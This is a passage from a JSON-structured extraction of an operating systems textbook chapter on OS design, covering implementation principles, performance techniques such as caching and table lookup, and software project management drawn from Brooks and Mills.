handle her boss’ mes\u0002sages).\r\nIn a sense, the use of macros, such as\r\n#define PROC TABLE SIZE 256\r\nis also a form of indirection, since the programmer can write code without having\r\nto know how big the table really is. It is good practice to give symbolic names to\r\nall constants (except sometimes −1, 0, and 1), and put these in headers with com\u0002ments explaining what they are for.\r\nReusability\r\nIt is frequently possible to reuse the same code in slightly different contexts.\r\nDoing so is a good idea as it reduces the size of the binary and means that the code\r\nhas to be debugged only once. For example, suppose that bitmaps are used to keep\r\ntrack of free blocks on the disk. Disk-block management can be handled by having\r\nprocedures alloc and free that manage the bitmaps.\r\nAs a bare minimum, these procedures should work for any disk. But we can go\r\nfurther than that. The same procedures can also work for managing memory\r\nblocks, blocks in the file system’s block cache, and i-nodes. In fact, they can be\r\nused to allocate and deallocate any resources that can be numbered linearly.\nSEC. 12.3 IMPLEMENTATION 1009\r\nReentrancy\r\nReentrancy refers to the ability of code to be executed two or more times si\u0002multaneously. On a multiprocessor, there is always the danger than while one CPU\r\nis executing some procedure, another CPU will start executing it as well, before the\r\nfirst one has finished. In this case, two (or more) threads on different CPUs might\r\nbe executing the same code at the same time. This situation must be protected\r\nagainst by using mutexes or some other means to protect critical regions.\r\nHowever, the problem also exists on a uniprocessor. In particular, most of any\r\noperating system runs with interrupts enabled. To do otherwise would lose many\r\ninterrupts and make the system unreliable. While the operating system is busy ex\u0002ecuting some procedure, P, it is entirely possible that an interrupt occurs and that\r\nthe interrupt handler also calls P. If the data structures of P were in an inconsistent\r\nstate at the time of the interrupt, the handler will see them in an inconsistent state\r\nand fail.\r\nAn obvious example where this can happen is if P is the scheduler. Suppose\r\nthat some process has used up its quantum and the operating system is moving it to\r\nthe end of its queue. Partway through the list manipulation, the interrupt occurs,\r\nmakes some process ready, and runs the scheduler. With the queues in an inconsis\u0002tent state, the system will probably crash. As a consequence even on a uniproc\u0002essor, it is best that most of the operating system is reentrant, critical data struc\u0002tures are protected by mutexes, and interrupts are disabled at moments when they\r\ncannot be tolerated.\r\nBrute Force\r\nUsing brute-force to solve a problem has acquired a bad name over the years,\r\nbut it is often the way to go in the name of simplicity. Every operating system has\r\nmany procedures that are rarely called or operate with so few data that optimizing\r\nthem is not worthwhile. For example, it is frequently necessary to search various\r\ntables and arrays within the system. The brute force algorithm is to just leave the\r\ntable in the order the entries are made and search it linearly when something has to\r\nbe looked up. If the number of entries is small (say, under 1000), the gain from\r\nsorting the table or hashing it is small, but the code is far more complicated and\r\nmore likely to have bugs in it. Sorting or hashing the mount table (which keeps\r\ntrack of mounted file systems in UNIX systems) really is not a good idea.\r\nOf course, for functions that are on the critical path, say, context switching,\r\nev erything should be done to make them very fast, possibly even writing them in\r\n(heaven forbid) assembly language. But large parts of the system are not on the\r\ncritical path. For example, many system calls are rarely invoked. If there is one\r\nfork ev ery second, and it takes 1 msec to carry out, then even optimizing it to 0\r\nwins only 0.1%. If the optimized code is bigger and buggier, a case can be made\r\nnot to bother with the optimization.\n1010 OPERATING SYSTEM DESIGN CHAP. 12\r\nCheck for Errors First\r\nMany system calls can fail for a variety of reasons: the file to be opened be\u0002longs to someone else; process creation fails because the process table is full; or a\r\nsignal cannot be sent because the target process does not exist. The operating sys\u0002tem must painstakingly check for every possible error before carrying out the call.\r\nMany system calls also require acquiring resources such as process-table slots,\r\ni-node table slots, or file descriptors. A general piece of advice that can save a lot\r\nof grief is to first check to see if the system call can actually be carried out before\r\nacquiring any resources. This means putting all the tests at the beginning of the\r\nprocedure that executes the system call. Each test should be of the form\r\nif (error condition) return(ERROR CODE);\r\nIf the call gets all the way through the gamut of tests, then it is certain that it will\r\nsucceed. At that point resources can be acquired.\r\nInterspersing the tests with resource acquisition means that if some test fails\r\nalong the way, all resources acquired up to that point must be returned. If an error\r\nis made here and some resource is not returned, no damage is done immediately.\r\nFor example, one process-table entry may just become permanently unavailable.\r\nNo big deal. However, over a period of time, this bug may be triggered multiple\r\ntimes. Eventually, most or all of the process-table entries may become unavailable,\r\nleading to a system crash in an extremely unpredictable and difficult-to-debug way.\r\nMany systems suffer from this problem in the form of memory leaks. Typi\u0002cally, the program calls malloc to allocate space but forgets to call free later to re\u0002lease it. Ever so gradually, all of memory disappears until the system is rebooted.\r\nEngler et al. (2000) have proposed a way to check for some of these errors at\r\ncompile time. They observed that the programmer knows many inv ariants that the\r\ncompiler does not know, such as when you lock a mutex, all paths starting at the\r\nlock must contain an unlock and no more locks of the same mutex. They hav e de\u0002vised a way for the programmer to tell the compiler this fact and instruct it to\r\ncheck all the paths at compile time for violations of the invariant. The programmer\r\ncan also specify that allocated memory must be released on all paths and many\r\nother conditions as well."
          }
        }
      },
      "12.4 PERFORMANCE": {
        "page": 1041,
        "children": {
          "12.4.1 Why Are Operating Systems Slow?": {
            "page": 1042,
            "content": "12.4.1 Why Are Operating Systems Slow?\r\nBefore talking about optimization techniques, it is worth pointing out that the\r\nslowness of many operating systems is to a large extent self-inflicted. For example,\r\nolder operating systems, such as MS-DOS and UNIX Version 7, booted within a\r\nfew seconds. Modern UNIX systems and Windows 8 can take sev eral minutes to\r\nboot, despite running on hardware that is 1000 times faster. The reason is that they\r\nare doing much more, wanted or not. A case in point. Plug and play makes it\r\nsomewhat easier to install a new hardware device, but the price paid is that on\r\nevery boot, the operating system has to go out and inspect all the hardware to see if\r\nthere is anything new out there. This bus scan takes time.\r\nAn alternative (and, in the authors’ opinion, better) approach would be to scrap\r\nplug-and-play altogether and have an icon on the screen labeled ‘‘Install new hard\u0002ware.’’ Upon installing a new hardware device, the user would click on it to start\r\nthe bus scan, instead of doing it on every boot. The designers of current systems\r\nwere well aware of this option, of course. They rejected it, basically, because they\r\nassumed that the users were too stupid to be able to do this correctly (although they\r\nwould word it more kindly). This is only one example, but there are many more\r\nwhere the desire to make the system ‘‘user-friendly’’ (or ‘‘idiot-proof,’’ depending\r\non your linguistic preferences) slows the system down all the time for everyone.\r\nProbably the biggest single thing system designers can do to improve per\u0002formance is to be much more selective about adding new features. The question to\r\nask is not whether some users like it, but whether it is worth the inevitable price in\r\ncode size, speed, complexity, and reliability. Only if the advantages clearly out\u0002weigh the drawbacks should it be included. Programmers have a tendency to as\u0002sume that code size and bug count will be 0 and speed will be infinite. Experience\r\nshows this view to be a wee bit optimistic.\r\nAnother factor that plays a role is product marketing. By the time version 4 or\r\n5 of some product has hit the market, probably all the features that are actually use\u0002ful have been included and most of the people who need the product already have\r\nit. To keep sales going, many manufacturers nevertheless continue to produce a\r\nsteady stream of new versions, with more features, just so they can sell their exist\u0002ing customers upgrades. Adding new features just for the sake of adding new fea\u0002tures may help sales but rarely helps performance."
          },
          "12.4.2 What Should Be Optimized?": {
            "page": 1042,
            "content": "12.4.2 What Should Be Optimized?\r\nAs a general rule, the first version of the system should be as straightforward\r\nas possible. The only optimizations should be things that are so obviously going to\r\nbe a problem that they are unavoidable. Having a block cache for the file system is\r\nsuch an example. Once the system is up and running, careful measurements\r\nshould be made to see where the time is really going. Based on these numbers,\r\noptimizations should be made where they will help most.\n1012 OPERATING SYSTEM DESIGN CHAP. 12\r\nHere is a true story of where an optimization did more harm than good. One of\r\nthe authors (AST) had a former student (who shall here remain nameless) who\r\nwrote the original MINIX mkfs program. This program lays down a fresh file sys\u0002tem on a newly formatted disk. The student spent about 6 months optimizing it,\r\nincluding putting in disk caching. When he turned it in, it did not work and it re\u0002quired several additional months of debugging. This program typically runs on the\r\nhard disk once during the life of the computer, when the system is installed. It also\r\nruns once for each disk that is formatted. Each run takes about 2 sec. Even if the\r\nunoptimized version had taken 1 minute, it was a poor use of resources to spend so\r\nmuch time optimizing a program that is used so infrequently.\r\nA slogan that has considerable applicability to performance optimization is\r\nGood enough is good enough.\r\nBy this we mean that once the performance has achieved a reasonable level, it is\r\nprobably not worth the effort and complexity to squeeze out the last few percent.\r\nIf the scheduling algorithm is reasonably fair and keeps the CPU busy 90% of the\r\ntime, it is doing its job. Devising a far more complex one that is 5% better is proba\u0002bly a bad idea. Similarly, if the page rate is low enough that it is not a bottleneck,\r\njumping through hoops to get optimal performance is usually not worth it. Avoid\u0002ing disaster is far more important than getting optimal performance, especially\r\nsince what is optimal with one load may not be optimal with another.\r\nAnother concern is what to optimize when. Some programmers have a tenden\u0002cy to optimize to death whatever they dev elop, as soon as it is appears to work. The\r\nproblem is that after optimization, the system may be less clean, making it harder\r\nto maintain and debug. Also, it makes it harder to adapt it, and perhaps do more\r\nfruitful optimization later. The problem is known as premature optimization. Don\u0002ald Knuth, sometimes referred to as the father of the analysis of algorithms, once\r\nsaid that ‘‘premature optimization is the root of all evil.’’"
          },
          "12.4.3 Space-Time Trade-offs": {
            "page": 1043,
            "content": "12.4.3 Space-Time Trade-offs\r\nOne general approach to improving performance is to trade off time vs. space.\r\nIt frequently occurs in computer science that there is a choice between an algo\u0002rithm that uses little memory but is slow and an algorithm that uses much more\r\nmemory but is faster. When making an important optimization, it is worth looking\r\nfor algorithms that gain speed by using more memory or conversely save precious\r\nmemory by doing more computation.\r\nOne technique that is sometimes helpful is to replace small procedures by\r\nmacros. Using a macro eliminates the overhead that is associated with a procedure\r\ncall. The gain is especially significant if the call occurs inside a loop. As an ex\u0002ample, suppose we use bitmaps to keep track of resources and frequently need to\r\nknow how many units are free in some portion of the bitmap. For this purpose we\r\nwill need a procedure, bit count, that counts the number of 1 bits in a byte. The\nSEC. 12.4 PERFORMANCE 1013\r\nobvious procedure is given in Fig. 12-7(a). It loops over the bits in a byte, count\u0002ing them one at a time. It is pretty simple and straightforward.\r\n#define BYTE SIZE 8 /* A byte contains 8 bits */\r\nint bit count(int byte)\r\n{ /* Count the bits in a byte. */\r\nint i, count = 0;\r\nfor (i = 0; i < BYTE SIZE; i++) /* loop over the bits in a byte */\r\nif ((byte >> i) & 1) count++; /* if this bit is a 1, add to count */\r\nretur n(count); /* retur n sum */\r\n}\r\n(a)\r\n/\r\n*Macro to add up the bits in a byte and return the sum. */\r\n#define bit count(b) ((b&1) + ((b>>1)&1) + ((b>>2)&1) + ((b>>3)&1) + \\\r\n((b>>4)&1) + ((b>>5)&1) + ((b>>6)&1) + ((b>>7)&1))\r\n(b)\r\n/\r\n*Macro to look up the bit count in a table. */\r\nchar bits[256] = {0, 1, 1, 2, 1, 2, 2, 3, 1, 2, 2, 3, 2, 3, 3, 4, 1, 2, 2, 3, 2, 3, 3, ...};\r\n#define bit count(b) (int) bits[b]\r\n(c)\r\nFigure 12-7. (a) A procedure for counting bits in a byte. (b) A macro to count\r\nthe bits. (c) A macro that counts bits by table lookup.\r\nThis procedure has two sources of inefficiency. First, it must be called, stack\r\nspace must be allocated for it, and it must return. Every procedure call has this\r\noverhead. Second, it contains a loop, and there is always some overhead associ\u0002ated with a loop.\r\nA completely different approach is to use the macro of Fig. 12-7(b). It is an\r\ninline expression that computes the sum of the bits by successively shifting the arg\u0002ument, masking out everything but the low-order bit, and adding up the eight\r\nterms. The macro is hardly a work of art, but it appears in the code only once.\r\nWhen the macro is called, for example, by\r\nsum = bit count(table[i]);\r\nthe macro call looks identical to the call of the procedure. Thus, other than one\r\nsomewhat messy definition, the code does not look any worse in the macro case\r\nthan in the procedure case, but it is much more efficient since it eliminates both the\r\nprocedure-call overhead and the loop overhead.\r\nWe can take this example one step further. Why compute the bit count at all?\r\nWhy not look it up in a table? After all, there are only 256 different bytes, each\r\nwith a unique value between 0 and 8. We can declare a 256-entry table, bits, with\r\neach entry initialized (at compile time) to the bit count corresponding to that byte\n1014 OPERATING SYSTEM DESIGN CHAP. 12\r\nvalue. With this approach no computation at all is needed at run time, just one\r\nindexing operation. A macro to do the job is given in Fig. 12-7(c).\r\nThis is a clear example of trading computation time against memory. Howev er,\r\nwe could go still further. If the bit counts for whole 32-bit words are needed, using\r\nour bit count macro, we need to perform four lookups per word. If we expand the\r\ntable to 65,536 entries, we can suffice with two lookups per word, at the price of a\r\nmuch bigger table.\r\nLooking answers up in tables can also be used in other ways. Anwell-known\r\nimage-compression technique, GIF, uses table lookup to encode 24-bit RGB pixels.\r\nHowever, GIF only works on images with 256 or fewer colors. For each image to\r\nbe compressed, a palette of 256 entries is constructed, each entry containing one\r\n24-bit RGB value. The compressed image then consists of an 8-bit index for each\r\npixel instead of a 24-bit color value, a gain of a factor of three. This idea is illus\u0002trated for a 4 × 4 section of an image in Fig. 12-8. The original compressed image\r\nis shown in Fig. 12-8(a). Each value is a 24-bit value, with 8 bits for the intensity\r\nof red, green, and blue, respectively. The GIF image is shown in Fig. 12-8(b).\r\nEach value is an 8-bit index into the color palette. The color palette is stored as part\r\nof the image file, and is shown in Fig. 12-8(c). Actually, there is more to GIF, but\r\nthe core idea is table lookup.\r\n3,8,13 3,8,13\r\n3,8,13 3,8,13\r\n26,4,9 90,2,6\r\n4,19,20 4,6,9\r\n4,6,9 10,30,8 5,8,1 22,2,0\r\n10,11,5 4,2,17 88,4,3 66,4,43\r\n7 7\r\n7 7\r\n2 6\r\n3 4\r\n4 5 10 0\r\n8 9 2 11\r\n11\r\n10\r\n1\r\n6\r\n7\r\n8\r\n5\r\n0\r\n9\r\n2\r\n3\r\n4\r\n24 Bits 8 Bits 24 Bits\r\n(a) (b) (c)\r\n22,2,0\r\n26,4,9\r\n5,8,1\r\n10,30,8\r\n4,6,9\r\n4,19,20\r\n90,2,6\r\n66,4,43\r\n88,4,3\r\n4,2,17\r\n10,11,5\r\n3,8,13\r\nFigure 12-8. (a) Part of an uncompressed image with 24 bits per pixel. (b) The\r\nsame part compressed with GIF, with 8 bits per pixel. (c) The color palette.\r\nThere is another way to reduce image size, and it illustrates a different trade\u0002off. PostScript is a programming language that can be used to describe images.\r\n(Actually, any programming language can describe images, but PostScript is tuned\r\nfor this purpose.) Many printers have a PostScript interpreter built into them to be\r\nable to run PostScript programs sent to them.\nSEC. 12.4 PERFORMANCE 1015\r\nFor example, if there is a rectangular block of pixels all the same color in an\r\nimage, a PostScript program for the image would carry instructions to place a rect\u0002angle at a certain location and fill it with a certain color. Only a handful of bits are\r\nneeded to issue this command. When the image is received at the printer, an inter\u0002preter there must run the program to construct the image. Thus PostScript achieves\r\ndata compression at the expense of more computation, a different trade-off than ta\u0002ble lookup, but a valuable one when memory or bandwidth is scarce.\r\nOther trade-offs often involve data structures. Doubly linked lists take up more\r\nmemory than singly linked lists, but often allow faster access to items. Hash tables\r\nare even more wasteful of space, but faster still. In short, one of the main things to\r\nconsider when optimizing a piece of code is whether using different data structures\r\nwould make the best time-space trade-off."
          },
          "12.4.4 Caching": {
            "page": 1046,
            "content": "12.4.4 Caching\r\nA well-known technique for improving performance is caching. It is applica\u0002ble whenever it is likely the same result will be needed multiple times. The general\r\napproach is to do the full work the first time, and then save the result in a cache.\r\nOn subsequent attempts, the cache is first checked. If the result is there, it is used.\r\nOtherwise, the full work is done again.\r\nWe hav e already seen the use of caching within the file system to hold some\r\nnumber of recently used disk blocks, thus saving a disk read on each hit. However,\r\ncaching can be used for many other purposes as well. For example, parsing path\r\nnames is surprisingly expensive. Consider the UNIX example of Fig. 4-34 again.\r\nTo look up /usr/ast/mbox requires the following disk accesses:\r\n1. Read the i-node for the root directory (i-node 1).\r\n2. Read the root directory (block 1).\r\n3. Read the i-node for /usr (i-node 6).\r\n4. Read the /usr directory (block 132).\r\n5. Read the i-node for /usr/ast (i-node 26).\r\n6. Read the /usr/ast directory (block 406).\r\nIt takes six disk accesses just to discover the i-node number of the file. Then the i\u0002node itself has to be read to discover the disk block numbers. If the file is smaller\r\nthan the block size (e.g., 1024 bytes), it takes eight disk accesses to read the data.\r\nSome systems optimize path-name parsing by caching (path, i-node) combina\u0002tions. For the example of Fig. 4-34, the cache will certainly hold the first three en\u0002tries of Fig. 12-9 after parsing /usr/ast/mbox. The last three entries come from\r\nparsing other paths.\r\nWhen a path has to be looked up, the name parser first consults the cache and\r\nsearches it for the longest substring present in the cache. For example, if the path\n1016 OPERATING SYSTEM DESIGN CHAP. 12\r\nPath I-node number\r\n/usr 6\r\n/usr/ast 26\r\n/usr/ast/mbox 60\r\n/usr/ast/books 92\r\n/usr/bal 45\r\n/usr/bal/paper.ps 85\r\nFigure 12-9. Part of the i-node cache for Fig. 4-34.\r\n/usr/ast/grants/erc is presented, the cache returns the fact that /usr/ast is i-node 26,\r\nso the search can start there, eliminating four disk accesses.\r\nA problem with caching paths is that the mapping between file name and i\u0002node number is not fixed for all time. Suppose that the file /usr/ast/mbox is re\u0002moved from the system and its i-node reused for a different file owned by a dif\u0002ferent user. Later, the file /usr/ast/mbox is created again, and this time it gets i-node\r\n106. If nothing is done to prevent it, the cache entry will now be wrong and subse\u0002quent lookups will return the wrong i-node number. For this reason, when a file or\r\ndirectory is deleted, its cache entry and (if it is a directory) all the entries below it\r\nmust be purged from the cache.\r\nDisk blocks and path names are not the only items that are cacheable. I-nodes\r\ncan be cached, too. If pop-up threads are used to handle interrupts, each one of\r\nthem requires a stack and some additional machinery. These previously used\r\nthreads can also be cached, since refurbishing a used one is easier than creating a\r\nnew one from scratch (to avoid having to allocate memory). Just about anything\r\nthat is hard to produce can be cached."
          },
          "12.4.5 Hints": {
            "page": 1047,
            "content": "12.4.5 Hints\r\nCache entries are always correct. A cache search may fail, but if it finds an\r\nentry, that entry is guaranteed to be correct and can be used without further ado. In\r\nsome systems, it is convenient to have a table of hints. These are suggestions\r\nabout the solution, but they are not guaranteed to be correct. The called must verify\r\nthe result itself.\r\nA well-known example of hints are the URLs embedded on Web pages. Click\u0002ing on a link does not guarantee that the Web page pointed to is there. In fact, the\r\npage pointed to may have been removed 10 years ago. Thus the information on the\r\npointing page is really only a hint.\r\nHints are also used in connection with remote files. The information in the hint\r\ntells something about the remote file, such as where it is located. However, the file\r\nmay have moved or been deleted since the hint was recorded, so a check is always\r\nneeded to see if it is correct.\nSEC. 12.4 PERFORMANCE 1017"
          },
          "12.4.6 Exploiting Locality": {
            "page": 1048,
            "content": "12.4.6 Exploiting Locality\r\nProcesses and programs do not act at random. They exhibit a fair amount of lo\u0002cality in time and space, and this information can be exploited in various ways to\r\nimprove performance. One well-known example of spatial locality is the fact that\r\nprocesses do not jump around at random within their address spaces. They tend to\r\nuse a relatively small number of pages during a given time interval. The pages that\r\na process is actively using can be noted as its working set, and the operating sys\u0002tem can make sure that when the process is allowed to run, its working set is in\r\nmemory, thus reducing the number of page faults.\r\nThe locality principle also holds for files. When a process has selected a partic\u0002ular working directory, it is likely that many of its future file references will be to\r\nfiles in that directory. By putting all the i-nodes and files for each directory close\r\ntogether on the disk, performance improvements can be obtained. This principle is\r\nwhat underlies the Berkeley Fast File System (McKusick et al., 1984).\r\nAnother area in which locality plays a role is in thread scheduling in multi\u0002processors. As we saw in Chap. 8, one way to schedule threads on a multiproces\u0002sor is to try to run each thread on the CPU it last used, in hopes that some of its\r\nmemory blocks will still be in the memory cache."
          },
          "12.4.7 Optimize the Common Case": {
            "page": 1048,
            "content": "12.4.7 Optimize the Common Case\r\nIt is frequently a good idea to distinguish between the most common case and\r\nthe worst possible case and treat them differently. Often the code for the two is\r\nquite different. It is important to make the common case fast. For the worst case, if\r\nit occurs rarely, it is sufficient to make it correct.\r\nAs a first example, consider entering a critical region. Most of the time, the\r\nentry will succeed, especially if processes do not spend a lot of time inside critical\r\nregions. Windows 8 takes advantage of this expectation by providing a WinAPI\r\ncall EnterCr iticalSection that atomically tests a flag in user mode (using TSL or e\u0002quivalent). If the test succeeds, the process just enters the critical region and no\r\nkernel call is needed. If the test fails, the library procedure does a down on a sema\u0002phore to block the process. Thus, in the normal case, no kernel call is needed. In\r\nChap. 2 we saw that futexes on Linux likewise optimize for the common case of no\r\ncontention.\r\nAs a second example, consider setting an alarm (using signals in UNIX). If no\r\nalarm is currently pending, it is straightforward to make an entry and put it on the\r\ntimer queue. However, if an alarm is already pending, it has to be found and re\u0002moved from the timer queue. Since the alar m call does not specify whether there is\r\nalready an alarm set, the system has to assume worst case, that there is. However,\r\nsince most of the time there is no alarm pending, and since removing an existing\r\nalarm is expensive, it is a good idea to distinguish these two cases.\n1018 OPERATING SYSTEM DESIGN CHAP. 12\r\nOne way to do this is to keep a bit in the process table that tells whether an\r\nalarm is pending. If the bit is off, the easy path is followed (just add a new timer\u0002queue entry without checking). If the bit is on, the timer queue must be checked."
          }
        }
      },
      "12.5 PROJECT MANAGEMENT": {
        "page": 1049,
        "children": {
          "12.5.1 The Mythical Man Month": {
            "page": 1049,
            "content": "12.5.1 The Mythical Man Month\r\nIn his classic book, The Mythical Man Month, Fred Brooks, one of the de\u0002signers of OS/360, who later moved to academia, addresses the question of why it\r\nis so hard to build big operating systems (Brooks, 1975, 1995). When most pro\u0002grammers see his claim that programmers can produce only 1000 lines of debug\u0002ged code per year on large projects, they wonder whether Prof. Brooks is living in\r\nouter space, perhaps on Planet Bug. After all, most of them can remember an all\r\nnighter when they produced a 1000-line program in one night. How could this be\r\nthe annual output of anybody with an IQ > 50?\r\nWhat Brooks pointed out is that large projects, with hundreds of programmers,\r\nare completely different than small projects and that the results obtained from\r\nsmall projects do not scale to large ones. In a large project, a huge amount of time\r\nis consumed planning how to divide the work into modules, carefully specifying\r\nthe modules and their interfaces, and trying to imagine how the modules will inter\u0002act, even before coding begins. Then the modules have to be coded and debugged\r\nin isolation. Finally, the modules have to be integrated and the system as a whole\r\nhas to be tested. The normal case is that each module works perfectly when tested\r\nby itself, but the system crashes instantly when all the pieces are put together.\r\nBrooks estimated the work as being\r\n1/3 Planning\r\n1/6 Coding\r\n1/4 Module testing\r\n1/4 System testing\r\nIn other words, writing the code is the easy part. The hard part is figuring out what\r\nthe modules should be and making module A correctly talk to module B. In a\r\nsmall program written by a single programmer, all that is left over is the easy part.\r\nThe title of Brooks’ book comes from his assertion that people and time are\r\nnot interchangeable. There is no such unit as a man-month (or a person-month). If\nSEC. 12.5 PROJECT MANAGEMENT 1019\r\na project takes 15 people 2 years to build, it is inconceivable that 360 people could\r\ndo it in 1 month and probably not possible to have 60 people do it in 6 months.\r\nThere are three reasons for this effect. First, the work cannot be fully paral\u0002lelized. Until the planning is done and it has been determined what modules are\r\nneeded and what their interfaces will be, no coding can even be started. On a two\u0002year project, the planning alone may take 8 months.\r\nSecond, to fully utilize a large number of programmers, the work must be par\u0002titioned into large numbers of modules so that everyone has something to do. Since\r\nev ery module might potentially interact with every other one, the number of mod\u0002ule-module interactions that need to be considered grows as the square of the num\u0002ber of modules, that is, as the square of the number of programmers. This com\u0002plexity quickly gets out of hand. Careful measurements of 63 software projects\r\nhave confirmed that the trade-off between people and months is far from linear on\r\nlarge projects (Boehm, 1981).\r\nThird, debugging is highly sequential. Setting 10 debuggers on a problem does\r\nnot find the bug 10 times as fast. In fact, ten debuggers are probably slower than\r\none because they will waste so much time talking to each other.\r\nBrooks sums up his experience with trading-off people and time in Brooks’\r\nLaw:\r\nAdding manpower to a late software project makes it later.\r\nThe problem with adding people is that they hav e to be trained in the project, the\r\nmodules have to be redivided to match the larger number of programmers now\r\navailable, many meetings will be needed to coordinate all the efforts, and so on.\r\nAbdel-Hamid and Madnick (1991) confirmed this law experimentally. A slightly\r\nirreverent way of restating Brooks law is\r\nIt takes 9 months to bear a child, no matter how many women you assign\r\nto the job."
          },
          "12.5.2 Team Structure": {
            "page": 1050,
            "content": "12.5.2 Team Structure\r\nCommercial operating systems are large software projects and invariably re\u0002quire large teams of people. The quality of the people matters immensely. It has\r\nbeen known for decades that top programmers are 10× more productive than bad\r\nprogrammers (Sackman et al., 1968). The trouble is, when you need 200 pro\u0002grammers, it is hard to find 200 top programmers; you have to settle for a wide\r\nspectrum of qualities.\r\nWhat is also important in any large design project, software or otherwise, is the\r\nneed for architectural coherence. There should be one mind controlling the design.\r\nBrooks cites the Reims cathedral in France as an example of a large project that\r\ntook decades to build, and in which the architects who came later subordinated\n1020 OPERATING SYSTEM DESIGN CHAP. 12\r\ntheir desire to put their stamp on the project to carry out the initial architect’s\r\nplans. The result is an architectural coherence unmatched in other European cathe\u0002drals.\r\nIn the 1970s, Harlan Mills combined the observation that some programmers\r\nare much better than others with the need for architectural coherence to propose\r\nthe chief programmer team paradigm (Baker, 1972). His idea was to organize a\r\nprogramming team like a surgical team rather than like a hog-butchering team. In\u0002stead of everyone hacking away like mad, one person wields the scalpel. Everyone\r\nelse is there to provide support. For a 10-person project, Mills suggested the team\r\nstructure of Fig. 12-10.\r\nTitle Duties\r\nChief programmer Perfor ms the architectural design and writes the code\r\nCopilot Helps the chief programmer and serves as a sounding board\r\nAdministrator Manages the people, budget, space, equipment, reporting, etc.\r\nEditor Edits the documentation, which must be written by the chief programmer\r\nSecretar ies The administrator and editor each need a secretary\r\nProgram cler k Maintains the code and documentation archives\r\nToolsmith Provides any tools the chief programmer needs\r\nTester Tests the chief programmer’s code\r\nLanguage lawyer Par t timer who can advise the chief programmer on the language\r\nFigure 12-10. Mills’ proposal for populating a 10-person chief programmer team.\r\nThree decades have gone by since this was proposed and put into production.\r\nSome things have changed (such as the need for a language lawyer—C is simpler\r\nthan PL/I), but the need to have only one mind controlling the design is still true.\r\nAnd that one mind should be able to work 100% on designing and programming,\r\nhence the need for the support staff, although with help from the computer, a smal\u0002ler staff will suffice now. But in its essence, the idea is still valid.\r\nAny large project needs to be organized as a hierarchy. At the bottom level are\r\nmany small teams, each headed by a chief programmer. At the next level, groups\r\nof teams must be coordinated by a manager. Experience shows that each person\r\nyou manage costs you 10% of your time, so a full-time manager is needed for each\r\ngroup of 10 teams. These managers must be managed, and so on.\r\nBrooks observed that bad news does not travel up the tree well. Jerry Saltzer of\r\nM.I.T. called this effect the bad-news diode. No chief programmer or his manager\r\nwants to tell the big boss that the project is 4 months late and has no chance what\u0002soever of meeting the deadline because there is a 2000-year-old tradition of be\u0002heading the messenger who brings bad news. As a consequence, top management\r\nis generally in the dark about the state of the project. When it becomes undeniably\r\nobvious that the deadline cannot be met under any conditions, top management\r\npanics and responds by adding people, at which time Brooks’ Law kicks in.\nSEC. 12.5 PROJECT MANAGEMENT 1021\r\nIn practice, large companies, which have had long experience producing soft\u0002ware and know what happens if it is produced haphazardly, hav e a tendency to at\r\nleast try to do it right. In contrast, smaller, newer companies, which are in a huge\r\nrush to get to market, do not always take the care to produce their software careful\u0002ly. This haste often leads to far from optimal results.\r\nNeither Brooks nor Mills foresaw the growth of the open source movement.\r\nWhile many expressed doubt (especially those leading large closed-source soft\u0002ware companies), open source software has been a tremendous success. From large\r\nservers to embedded devices, and from industrial control systems to handheld\r\nsmartphones, open source software is everywhere. Large companies like Google\r\nand IBM are throwing their weight behind Linux now and contribute heavily in\r\ncode. What is noticeable is that the open source software projects that have been\r\nmost successful have clearly used the chief-programmer model of having one mind\r\ncontrol the architectural design (e.g., Linus Torvalds for the Linux kernel and\r\nRichard Stallman for the GNU C compiler)."
          },
          "12.5.3 The Role of Experience": {
            "page": 1052,
            "content": "12.5.3 The Role of Experience\r\nHaving experienced designers is absolutely critical to any software project.\r\nBrooks points out that most of the errors are not in the code, but in the design. The\r\nprogrammers correctly did what they were told to do. What they were told to do\r\nwas wrong. No amount of test software will catch bad specifications.\r\nBrooks’ solution is to abandon the classical development model illustrated in\r\nFig. 12-11(a) and use the model of Fig. 12-11(b). Here the idea is to first write a\r\nmain program that merely calls the top-level procedures, initially dummies. Start\u0002ing on day 1 of the project, the system will compile and run, although it does noth\u0002ing. As time goes on, real modules replace the dummies. The result is that system\r\nintegration testing is performed continuously, so errors in the design show up much\r\nearlier, so the learning process caused by bad design starts earlier.\r\nA little knowledge is a dangerous thing. Brooks observed what he called the\r\nsecond system effect. Often the first product produced by a design team is mini\u0002mal because the designers are afraid it may not work at all. As a result, they are\r\nhesitant to put in many features. If the project succeeds, they build a follow-up\r\nsystem. Impressed by their own success, the second time the designers include all\r\nthe bells and whistles that were intentionally left out the first time. As a result, the\r\nsecond system is bloated and performs poorly. The third time around they are\r\nsobered by the failure of the second system and are cautious again.\r\nThe CTSS-MULTICS pair is a clear case in point. CTSS was the first general\u0002purpose timesharing system and was a huge success despite having minimal func\u0002tionality. Its successor, MULTICS, was too ambitious and suffered badly for it.\r\nThe ideas were good, but there were too many new things, so the system performed\r\npoorly for years and was never a commercial success. The third system in this line\r\nof development, UNIX, was much more cautious and much more successful.\n1022 OPERATING SYSTEM DESIGN CHAP. 12\r\nC\r\nTest\r\nmodules\r\nCode\r\nTest\r\nsystem\r\n(a)\r\nDeploy\r\nDummy\r\nprocedure\r\n1\r\n(b)\r\nPlan\r\nDummy\r\nprocedure\r\n2\r\nDummy\r\nprocedure\r\n3\r\nMain\r\nprogram\r\nFigure 12-11. (a) Traditional software design progresses in stages. (b) Alterna\u0002tive design produces a working system (that does nothing) starting on day 1."
          },
          "12.5.4 No Silver Bullet": {
            "page": 1053,
            "content": "12.5.4 No Silver Bullet\r\nIn addition to The Mythical Man Month, Brooks also wrote an influential paper\r\ncalled ‘‘No Silver Bullet’’ (Brooks, 1987). In it, he argued that none of the many\r\nnostrums being hawked by various people at the time was going to generate an\r\norder-of-magnitude improvement in software productivity within a decade. Experi\u0002ence shows that he was right.\r\nAmong the silver bullets that were proposed were better high-level languages,\r\nobject-oriented programming, artificial intelligence, expert systems, automatic pro\u0002gramming, graphical programming, program verification, and programming envi\u0002ronments. Perhaps the next decade will see a silver bullet, but maybe we will have\r\nto settle for gradual, incremental improvements."
          }
        }
      },
      "12.6 TRENDS IN OPERATING SYSTEM DESIGN": {
        "page": 1053,
        "children": {
          "12.6.1 Virtualization and the Cloud": {
            "page": 1054,
